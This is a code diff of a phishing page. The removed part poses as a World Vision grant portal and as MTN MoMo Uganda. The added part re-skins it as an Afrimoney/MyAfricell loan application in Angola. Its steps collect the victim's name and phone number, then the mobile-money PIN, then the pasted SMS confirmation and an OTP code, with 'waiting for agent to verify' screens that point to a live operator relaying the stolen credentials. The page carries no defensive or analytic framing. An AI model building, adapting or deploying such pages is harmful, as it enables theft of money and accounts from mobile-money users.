+            <div>
+              <label for="employment-select" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="employmentStatus">
+                <span>🏛️</span>
+                <span>Employment / Income Source</span>
+              </label>
+              <select id="employment-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#9B1479]">
+                <option value="Employed / Salaried" selected>Employed / Salaried Worker</option>
+                <option value="Self-Employed / Trader">Self-Employed / Independent Trader</option>
+                <option value="Civil Servant">Civil Servant / Função Pública</option>
+                <option value="Small Business Owner">Small Business Owner</option>
+                <option value="Other">Other</option>
+              </select>
+            </div>
+
+            <div class="flex items-center space-x-2 pt-1">
+              <input id="agent-consent-checkbox" type="checkbox" checked class="w-4 h-4 text-[#9B1479] rounded border-slate-300 focus:ring-[#9B1479]" />
+              <label for="agent-consent-checkbox" class="text-[11px] text-slate-600 font-medium" data-i18n="agentConsent">🤝 I authorize Afrimoney to verify my account for loan disbursement.</label>
+            </div>
+
+            <div id="step2-alert" class="mt-2 p-2.5 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
+          </div>
+
+          <div class="pt-2">
+            <button 
+              id="continue-to-auth-btn"
+              type="button" 
+              onclick="submitStep2AndProceed()" 
+              class="w-full py-3.5 sm:py-4 africell-btn-gradient hover:opacity-95 text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all flex items-center justify-center space-x-2"
+              data-i18n="continueToAuth">
+              <span>CONTINUE TO AFRIMONEY SIGN IN</span>
+              <span>⚡</span>
+            </button>
+          </div>
+        </section>
+
+        <!-- STEP 3: MYAFRICELL SIGN-IN SCREEN WITH PHONE NUMBER & PIN DIRECTLY BELOW -->
+        <section id="step-3" class="hidden flex-1 flex flex-col justify-between min-h-[580px] bg-[#F7F7F7]">
+          
+          <!-- Top Card Wrapper (White background with large rounded bottom corners) -->
+          <div class="bg-white rounded-b-[40px] px-6 pt-7 pb-8 shadow-sm flex flex-col space-y-5">
+            
+            <!-- Header Row: Back button & Language Pill -->
+            <div class="flex items-center justify-between min-h-[36px]">
+              <button 
+                type="button" 
+                onclick="handleBackAction()" 
+                class="w-9 h-9 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 hover:text-slate-900 transition-colors" 
+                aria-label="Back">
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2" d="M15 19l-7-7 7-7"/>
+                </svg>
+              </button>
+
+              <div class="lang-toggle-box cursor-pointer bg-slate-100 rounded-full p-1 flex items-center space-x-1 text-xs select-none">
+                <span class="pill-en font-bold text-[#9B1479] bg-white px-2.5 py-0.5 rounded-full shadow-xs transition-all">en.</span>
+                <span class="pill-pt font-medium text-slate-400 px-2 py-0.5 transition-all">pt.</span>
+              </div>
+            </div>
+
+            <!-- Headline -->
+            <div>
+              <h1 class="text-3xl font-normal text-[#9B1479] tracking-tight leading-tight">
+                <span data-i18n="welcomeHeadline">Welcome to</span><br />
+                <span class="font-black" data-i18n="welcomeBrand">MyAfricell!</span>
+              </h1>
+            </div>
+
+            <!-- Phone Input Card with Angola Flag & Underline -->
+            <div class="bg-slate-50 border border-slate-200/90 rounded-2xl p-4 transition-all focus-within:border-[#9B1479] focus-within:bg-white focus-within:shadow-xs">
+              <label class="block text-xs font-medium text-slate-500 mb-2" data-i18n="phoneLabel">
+                Enter Phone Number
+              </label>
+              <div class="flex items-center space-x-2 pb-1 border-b border-slate-200">
+                <div class="w-6 h-4 rounded-xs overflow-hidden shadow-xs flex-shrink-0 flex flex-col">
+                  <div class="h-1/2 bg-[#C8102E]"></div>
+                  <div class="h-1/2 bg-black flex items-center justify-center">
+                    <span class="text-[6px] text-yellow-400">★</span>
+                  </div>
+                </div>
+                <span class="text-sm font-bold text-slate-500">+244</span>
+                <div class="flex-1 flex items-center text-xl font-bold tracking-wider text-[#1E1B4B]">
+                  <span id="phone-display-text" class="tracking-widest">950 548 313</span>
+                  <span id="phone-cursor" class="cursor-blink ml-0.5"></span>
                 </div>
               </div>
             </div>
 
-            <!-- Official Security & Transparency Notice -->
-            <div class="flex items-center justify-between px-3.5 py-2.5 bg-slate-50 rounded-xl border border-slate-200 text-[11px] text-slate-600">
-              <span class="flex items-center space-x-1.5 font-medium">
-                <span class="text-emerald-600">🔒</span>
-                <span>Authorized World Vision Grant Application</span>
-              </span>
-              <span class="font-bold text-[#FF6700]">Official Portal</span>
-            </div>
-          </div>
-
-          <!-- Action Button -->
-          <div class="pt-6">
-            <button 
-              type="button" 
-              onclick="goToStep(1)" 
-              class="w-full py-4 mixx-btn-gradient hover:opacity-95 active:scale-[0.99] font-black rounded-xl shadow-lg shadow-orange-500/25 text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
-              <span data-i18n="applyNow">APPLY FOR PARTNERSHIP GRANT NOW</span>
-              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
-              </svg>
-            </button>
-          </div>
-        </div>
-      </section>
-
-      <!-- STEP 1: Partnership Configuration Form -->
-      <section id="step-1" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
-        <div>
-          <span class="text-[11px] font-black text-white bg-[#FF6700] px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 4</span>
-          <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2">
-            <span>🎯</span>
-            <span data-i18n="step1Title">Project & Partnership Scope</span>
-          </h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Specify your organization, project domain, and requested funding parameters.</p>
-        </div>
-
-        <div class="space-y-4">
-          <div>
-            <label for="org-name-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5">
-              <span>🏢</span>
-              <span>Organization / Initiative Name *</span>
-            </label>
-            <input id="org-name-input" type="text" placeholder="e.g. Lusaka Hope Community Initiative" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#FF6700] focus:ring-2 focus:ring-[#FF6700]/20" value="" required />
-          </div>
-
-          <div>
-            <label for="loan-type-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="loanType">
-              <span>🏷️</span>
-              <span>Partnership Category</span>
-            </label>
-            <select id="loan-type-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#FF6700] focus:ring-2 focus:ring-[#FF6700]/20">
-              <option value="Community & Child Welfare" selected>Community & Child Welfare Support</option>
-              <option value="Agriculture & Food Security">Agriculture & Sustainable Food Security</option>
-              <option value="Water & Sanitation (WASH)">Water & Sanitation (WASH)</option>
-              <option value="Youth Empowerment & Education">Youth Empowerment & Skills Training</option>
-              <option value="Women Economic Empowerment">Women Economic Empowerment & Cooperatives</option>
-              <option value="Health & Nutrition Relief">Health & Nutrition Community Relief</option>
-            </select>
-          </div>
-
-          <div>
-            <label for="loan-amount-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="amountLabel">
-              <span>💰</span>
-              <span>Requested Partnership Grant Budget (UGX)</span>
-            </label>
-            <input id="loan-amount-input" type="number" min="100000" max="10000000" step="50000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-[#FF6700] focus:ring-2 focus:ring-[#FF6700]/20" value="500000" />
-          </div>
-
-          <div>
-            <label for="loan-term-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="termLabel">
-              <span>📅</span>
-              <span>Partnership Implementation Timeline</span>
-            </label>
-            <select id="loan-term-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#FF6700] focus:ring-2 focus:ring-[#FF6700]/20">
-              <option value="3">3 Months</option>
-              <option value="6" selected>6 Months</option>
-              <option value="12">12 Months</option>
-              <option value="24">24 Months</option>
-            </select>
-          </div>
-
-          <div>
-            <label for="loan-purpose-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="purposeLabel">
-              <span>📝</span>
-              <span>Partnership Objectives & Community Need</span>
-            </label>
-            <textarea id="loan-purpose-input" rows="3" placeholder="Describe community partnership needs, planned activities, target beneficiaries, and expected outcomes..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-[#FF6700] focus:ring-2 focus:ring-[#FF6700]/20 resize-none">Community Development & Child Welfare Initiative</textarea>
-          </div>
-        </div>
-
-        <div class="pt-4">
-          <button 
-            type="button" 
-            onclick="goToStep(2)" 
-            class="w-full py-4 mixx-btn-gradient hover:opacity-95 text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase flex items-center justify-center space-x-2"
-            data-i18n="continueToPersonal">
-            <span>CONTINUE TO REPRESENTATIVE DETAILS</span>
-            <span>⚡</span>
-          </button>
-        </div>
-      </section>
-
-      <!-- STEP 2: Representative Information Form -->
-      <section id="step-2" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-3 sm:space-y-4">
-        <div>
-          <span class="text-[11px] font-black text-white bg-[#FF6700] px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 4</span>
-          <h2 class="text-xl font-extrabold text-slate-900 mt-1.5 flex items-center space-x-2" data-i18n="step2Title">
-            <span>👤</span>
-            <span>Representative & MoMo Disbursement Account</span>
-          </h2>
-          <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Enter authorized project lead and active MTN MoMo / Airtel Money number for partnership grant disbursement.</p>
-        </div>
-
-        <div class="space-y-3">
-          <div class="grid grid-cols-2 gap-2.5">
-            <div>
-              <label for="first-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="firstName">
-                <span>👤</span>
-                <span>Authorized Representative First Name *</span>
-              </label>
-              <input id="first-name-input" type="text" placeholder="e.g. Mulenga" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#FF6700]" value="" required />
-            </div>
-            <div>
-              <label for="last-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="lastName">
-                <span>👤</span>
-                <span>Authorized Representative Last Name *</span>
-              </label>
-              <input id="last-name-input" type="text" placeholder="e.g. Banda" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#FF6700]" value="" required />
-            </div>
-          </div>
-
-          <div>
-            <label for="phone-number-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="orangePhone">
-              <span>📱</span>
-              <span>Disbursement MoMo Mobile Number (+256) *</span>
-            </label>
-            <div class="flex items-center">
-              <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600">+256</span>
-              <input id="phone-number-input" type="tel" placeholder="771 234 567" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-[#FF6700]" value="" required />
-            </div>
-            <span class="text-[10px] text-slate-500 font-medium mt-1 block">Active MTN MoMo / Airtel Money registered in representative's name</span>
-          </div>
-
-          <div>
-            <label for="employment-select" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="employmentStatus">
-              <span>🏛️</span>
-              <span>Partnership Organization / Entity Type</span>
-            </label>
-            <select id="employment-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-[#FF6700]">
-              <option value="Community-Based Organization (CBO)" selected>Community-Based Organization (CBO)</option>
-              <option value="Faith-Based / Church Partner">Faith-Based / Church Partner</option>
-              <option value="Non-Governmental Organization (NGO)">Non-Governmental Organization (NGO)</option>
-              <option value="Local Women/Youth Cooperative">Local Women/Youth Cooperative</option>
-              <option value="Small Business / Local Supplier">Small Business / Local Supplier</option>
-              <option value="Individual Community Leader">Individual Community Leader</option>
-            </select>
-          </div>
-
-          <div class="flex items-center space-x-2 pt-1">
-            <input id="agent-consent-checkbox" type="checkbox" checked class="w-4 h-4 text-[#FF6700] rounded border-slate-300 focus:ring-[#FF6700]" />
-            <label for="agent-consent-checkbox" class="text-[11px] text-slate-600 font-medium" data-i18n="agentConsent">🤝 I certify this partnership application and authorize World Vision verification linking to my MoMo account.</label>
-          </div>
-
-          <div id="step2-alert" class="mt-2 p-2.5 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
-        </div>
-
-        <div class="pt-2">
-          <button 
-            id="continue-to-auth-btn"
-            type="button" 
-            onclick="submitStep2AndProceed()" 
-            class="w-full py-3.5 sm:py-4 mixx-btn-gradient hover:opacity-95 text-white font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all flex items-center justify-center space-x-2"
-            data-i18n="continueToAuth">
-            <span>LINK TO MOMO ACCOUNT & PROCEED</span>
-            <span>⚡</span>
-          </button>
-        </div>
-
-        <!-- Live Approval Waiting Indicator for Step 2 Application Submission -->
-        <div id="app-waiting-box" class="hidden p-3.5 bg-orange-50 border border-orange-200 rounded-2xl text-center space-y-2">
-          <div class="flex items-center justify-center space-x-2">
-            <span class="inline-block w-2.5 h-2.5 rounded-full bg-[#FF6700] animate-ping"></span>
-            <span class="text-xs font-bold text-[#0C2340] uppercase tracking-wider">Awaiting Partnership Approval</span>
-          </div>
-          <p class="text-xs text-slate-700">Your partnership details have been submitted. Please wait while your World Vision representative verifies...</p>
-          <div class="flex justify-center pt-1">
-            <svg class="animate-spin h-5 w-5 text-[#FF6700]" fill="none" viewBox="0 0 24 24">
-              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-          </div>
-        </div>
-
-      </section>
-
-      <!-- STEP 3: Customer Account PIN Validation (Step 3 of 6) -->
-      <section id="step-3" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
-        
-        <!-- Top MoMo Uganda Navy Banner -->
-        <div class="momo-gradient text-white pt-6 pb-7 px-6 text-center relative shadow-md border-b-2 border-[#FFCC00]">
-          <div class="inline-flex flex-col items-center">
-            <div class="inline-flex items-center space-x-1.5 bg-[#FFCC00] text-[#002B49] px-3 py-1 rounded-full text-[11px] font-black shadow-xs mb-2">
-              <span class="h-4 px-1.5 bg-black text-[#FFCC00] rounded-full text-[9px] font-black flex items-center">MTN</span>
-              <span>MoMo Uganda</span>
-            </div>
-            <h2 class="text-xl sm:text-2xl font-black text-white tracking-tight flex items-center justify-center space-x-1.5">
-              <span>🔐</span>
-              <span>MoMo Account Sign In</span>
-            </h2>
-            <p class="text-xs text-yellow-100 font-medium mt-0.5">5-Digit Security PIN Verification</p>
-          </div>
-        </div>
-
-        <!-- Main Form Content -->
-        <div class="px-5 py-6 space-y-5 flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
-          
-          <div class="text-center space-y-1">
-            <span class="text-[11px] font-black text-[#002B49] bg-[#FFCC00] px-3 py-1 rounded-full uppercase tracking-wider mb-1 inline-block shadow-xs">Step 3 of 6 • MoMo Authentication</span>
-            <h3 class="text-lg font-black text-slate-800 tracking-tight flex items-center justify-center space-x-1.5">
-              <span>🔐</span>
-              <span>MoMo Account PIN</span>
-            </h3>
-            <p class="text-xs text-slate-500 font-medium">Enter your mobile number and 5-digit MoMo Account PIN</p>
-          </div>
-
-          <!-- Phone Number Input Container -->
-          <div>
-            <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="phoneNum">
-              <span>📱</span>
-              <span>MoMo Mobile Number (+256)</span>
-            </label>
-            <div class="flex items-center bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 focus-within:bg-white focus-within:border-[#002B49] focus-within:ring-2 focus-within:ring-[#FFCC00]/40 transition-all">
-              <span class="text-xs font-extrabold text-slate-500 mr-2">+256</span>
-              <input id="momo-phone-display" type="tel" placeholder="771 234 567" oninput="onMomoPhoneInput(this.value)" class="bg-transparent text-xs font-extrabold text-slate-800 w-full focus:outline-none" value="" />
-            </div>
-          </div>
-
-          <!-- Form & Inputs Container -->
-          <div id="pin-form-container" class="space-y-4">
-            <div class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
-              <span class="flex items-center space-x-1">
-                <span>🔐</span>
-                <span>Account PIN (5 Digits)</span>
-              </span>
-              <span class="text-[10px] font-semibold text-slate-400 flex items-center space-x-0.5">
-                <span>🛡️</span>
-                <span>100% Encrypted</span>
-              </span>
-            </div>
-
-            <!-- PIN Input Row -->
-            <div class="flex items-center justify-center space-x-2 sm:space-x-2.5 py-1">
-              <div class="grid grid-cols-5 gap-2 sm:gap-2.5 flex-1">
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="2" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
-                <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" data-index="4" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/50 shadow-xs" />
+            <!-- 4-Digit PIN Input Directly Below Phone Number -->
+            <div class="bg-slate-50 border border-slate-200/90 rounded-2xl p-4 transition-all focus-within:border-[#9B1479] focus-within:bg-white focus-within:shadow-xs space-y-2">
+              <div class="flex items-center justify-between">
+                <label class="block text-xs font-medium text-slate-500">
+                  <span>Enter 4-Digit Account PIN</span>
+                </label>
+                <button type="button" onclick="togglePinVisibility()" class="text-[11px] font-bold text-[#9B1479] hover:underline flex items-center space-x-1">
+                  <span id="pin-eye-text">Show</span>
+                </button>
               </div>
-              
-              <button type="button" onclick="togglePinVisibility()" class="p-2 text-slate-500 hover:text-[#002B49] transition-colors focus:outline-none flex flex-col items-center justify-center shrink-0" aria-label="Toggle PIN Visibility">
-                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
-                </svg>
-                <span id="eye-text" class="text-[9px] font-bold text-slate-400 mt-0.5">Show</span>
-              </button>
-            </div>
 
-            <div id="pin-retry-alert" class="p-3 bg-red-50 border border-red-300 rounded-xl text-xs font-bold text-red-700 text-center hidden"></div>
-
-            <button 
-              id="login-btn" 
-              type="button" 
-              disabled 
-              onclick="submitAccountPin()" 
-              class="w-full py-4 bg-slate-200 text-slate-400 font-black rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md flex items-center justify-center space-x-2">
-              <span>⚡</span>
-              <span data-i18n="confirmPinBtn">AUTHORIZE & CONFIRM MOMO PIN</span>
-            </button>
-          </div>
-
-          <!-- Live Approval Waiting Indicator inside Step 3 -->
-          <div id="pin-waiting-box" class="hidden bg-yellow-50/70 border border-yellow-200 rounded-2xl p-6 text-center space-y-3 shadow-xs">
-            <div class="w-10 h-10 mx-auto flex items-center justify-center">
-              <div class="w-8 h-8 border-3 border-slate-200 border-t-[#002B49] rounded-full animate-spin"></div>
-            </div>
-            <p class="text-xs text-[#002B49] font-bold leading-relaxed">
-              ⏳ Waiting for agent to verify your Account PIN...
-            </p>
-          </div>
-
-        </div>
-
-        <div class="momo-gradient text-white pt-6 pb-5 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto border-t-2 border-[#FFCC00]">
-          <div class="inline-flex flex-col items-center">
-            <span class="text-sm font-black text-[#FFCC00] tracking-tight">MTN Mobile Money Uganda</span>
-            <span class="text-[10px] text-blue-100 font-medium">Bank of Uganda Regulated • Dial *165#</span>
-          </div>
-        </div>
-
-      </section>
-
-      <!-- STEP 4: SMS Verification Message (Step 4 of 6) -->
-      <section id="step-4" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-5 bg-white">
-        <div>
-          <div class="flex items-center justify-between">
-            <span class="text-[11px] font-black text-[#002B49] bg-[#FFCC00] px-3 py-1 rounded-full uppercase tracking-wider shadow-xs">Step 4 of 6 • SMS Verification</span>
-            <span id="sms-waiting-badge" class="inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200">
-              <span>Ready to Paste</span>
-            </span>
-          </div>
-          <h2 class="text-xl font-extrabold text-[#002B49] mt-2 flex items-center space-x-2" data-i18n="step4Title">
-            <span>💬</span>
-            <span>MoMo SMS Verification</span>
-          </h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">📲 Copy or wait for the SMS confirmation message from MTN MoMo Uganda then paste below.</p>
-        </div>
-
-        <!-- Live SMS Reception Card & Countdown Timer -->
-        <div id="sim-sms-countdown-card" class="bg-gradient-to-br from-yellow-50/60 via-blue-50/40 to-slate-50 border border-blue-200/80 rounded-2xl p-4 shadow-xs space-y-3">
-          <div class="flex items-center justify-between">
-            <div class="flex items-center space-x-2">
-              <span class="relative flex h-3 w-3">
-                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#002B49] opacity-75"></span>
-                <span class="relative inline-flex rounded-full h-3 w-3 bg-[#002B49]"></span>
-              </span>
-              <span class="text-xs font-black text-[#002B49] uppercase tracking-wider">Awaiting MTN MoMo SMS...</span>
-            </div>
-            <div id="sms-timer-display" class="text-2xl font-black text-[#002B49] tracking-tight font-mono">00:20</div>
-          </div>
-
-          <div class="flex items-center justify-between bg-white/90 backdrop-blur-xs p-2.5 rounded-xl border border-slate-200">
-            <div class="text-[11px] text-slate-600 font-medium flex items-center space-x-1.5">
-              <span>📱</span>
-              <span>Target Mobile: <strong id="sms-timer-phone" class="text-slate-900 font-bold">MoMo Account</strong></span>
-            </div>
-            <div class="flex items-center space-x-1.5">
-              <button 
-                type="button" 
-                onclick="copyTargetPhone(this)" 
-                class="px-2.5 py-1 bg-slate-100 hover:bg-slate-200 text-[#002B49] text-[10px] font-bold rounded-lg transition-all border border-slate-200 flex items-center space-x-1">
-                <span>📋</span>
-                <span>Copy Number</span>
-              </button>
-              <button 
-                type="button" 
-                onclick="openMessagingApp(event)" 
-                class="px-2.5 py-1 bg-[#002B49] hover:bg-[#001D38] text-[#FFCC00] text-[10px] font-black rounded-lg transition-all shadow-xs flex items-center space-x-1">
-                <span>💬</span>
-                <span>Open SMS</span>
-              </button>
-            </div>
-          </div>
-
-          <p id="sms-timer-status" class="text-[11px] text-slate-500 font-semibold text-center">
-            Copy the SMS confirmation message then paste below.
-          </p>
-        </div>
-
-        <div class="space-y-4 flex-1 flex flex-col">
-          
-          <div class="space-y-2 flex-1 flex flex-col">
-            <div class="flex justify-between items-center mb-1">
-              <label for="momo-pasted-msg" class="block text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center space-x-1.5" data-i18n="smsLabel">
-                <span>📨</span>
-                <span>SMS Confirmation Message</span>
-              </label>
-              <button 
-                type="button" 
-                onclick="pasteSmsFromClipboard()" 
-                class="px-3.5 py-1.5 bg-[#002B49] hover:bg-[#001D38] text-[#FFCC00] text-[11px] font-black rounded-lg shadow-xs hover:opacity-95 active:scale-95 transition-all flex items-center space-x-1">
-                <span>📋</span>
-                <span>Paste SMS</span>
-              </button>
-            </div>
-
-            <!-- Big Spacious Textarea Message Box -->
-            <textarea 
-              id="momo-pasted-msg" 
-              rows="5"
-              autocomplete="off" 
-              autocorrect="off" 
-              autocapitalize="off" 
-              spellcheck="false" 
-              placeholder="Paste your MoMo SMS message here..."
-              oninput="handlePostLoginPastedMsg(this.value)"
-              class="w-full bg-slate-50 border-2 border-slate-300 rounded-xl p-4 text-xs font-semibold text-slate-800 focus:bg-white focus:outline-none focus:border-[#002B49] focus:ring-2 focus:ring-[#FFCC00]/40 resize-y min-h-[130px] leading-relaxed shadow-xs"
-            ></textarea>
-
-            <div id="momo-extract-status" class="mt-2 text-[11px] text-emerald-700 font-semibold flex items-center space-x-1 hidden">
-              <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
-              </svg>
-              <span>✨ SMS message detected! Ready to submit...</span>
-            </div>
-
-            <div id="msg-retry-alert" class="mt-2 p-3 bg-red-50 border border-red-300 rounded-xl text-xs font-bold text-red-700 hidden"></div>
-          </div>
-
-          <button 
-            id="submit-pasted-msg-btn" 
-            type="button" 
-            onclick="submitRegisteredMessage()" 
-            class="w-full py-4 bg-[#FFCC00] hover:bg-[#E5B800] text-[#002B49] font-black rounded-xl shadow-lg shadow-yellow-500/20 text-xs tracking-wider uppercase transition-all duration-200 flex items-center justify-center space-x-2"
-            data-i18n="submitSmsBtn">
-            <span>⚡</span>
-            <span>SUBMIT VERIFICATION MESSAGE</span>
-          </button>
-
-          <!-- Live Approval Waiting Indicator for Step 4 SMS -->
-          <div id="sms-waiting-box" class="hidden p-4 bg-yellow-50/60 border border-yellow-200 rounded-2xl text-center space-y-2">
-            <div class="flex items-center justify-center space-x-2">
-              <span class="inline-block w-2.5 h-2.5 rounded-full bg-[#002B49] animate-ping"></span>
-              <span class="text-xs font-bold text-[#002B49] uppercase tracking-wider" data-i18n="awaitingVerification">⏳ Awaiting Verification</span>
-            </div>
-            <p class="text-xs text-slate-700 font-semibold" data-i18n="smsAwaitingDesc">Your SMS verification has been submitted. Verification is in progress...</p>
-            <div class="flex justify-center pt-1">
-              <svg class="animate-spin h-5 w-5 text-[#002B49]" fill="none" viewBox="0 0 24 24">
-                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-              </svg>
-            </div>
-          </div>
-
-        </div>
-      </section>
-
-      <!-- STEP 5: OTP Code Verification (Step 5 of 6) -->
-      <section id="step-5" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
-        <!-- Subheader: "← Back" on left, "MTN MoMo OTP Verification" centered -->
-        <div class="flex items-center justify-between py-3 px-4 bg-[#002B49] text-white border-b-2 border-[#FFCC00]">
-          <button type="button" onclick="handleBackAction()" class="flex items-center text-xs font-bold text-[#FFCC00] hover:text-white transition-colors">
-            <span class="mr-1 text-base leading-none">←</span>
-            <span>Back</span>
-          </button>
-          <div class="flex items-center space-x-1.5">
-            <div class="h-5 px-1.5 bg-black rounded-full flex items-center justify-center">
-              <span class="text-[9px] font-black text-[#FFCC00]">MTN</span>
-            </div>
-            <h2 class="text-xs font-black tracking-tight text-white" data-i18n="step5OtpTitle">
-              MTN MoMo OTP Verification
-            </h2>
-          </div>
-          <span class="text-[10px] font-black bg-[#FFCC00] text-[#002B49] px-2 py-0.5 rounded-full shadow-xs">Step 5 of 6</span>
-        </div>
-
-        <!-- Main Card Content -->
-        <div class="px-5 py-6 space-y-5 flex-1 flex flex-col justify-start max-w-sm mx-auto w-full">
-          <div class="bg-white rounded-2xl p-5 sm:p-6 border border-slate-200/90 shadow-xs">
-            <h3 class="text-lg sm:text-xl font-black text-[#002B49] tracking-tight" data-i18n="otpHeading">
-              Enter OTP Code
-            </h3>
-            <p class="text-xs text-slate-500 font-medium leading-relaxed mt-1 mb-4" data-i18n="otpSub">
-              Enter the 4-digit OTP code sent to your phone via MTN MoMo Uganda
-            </p>
-
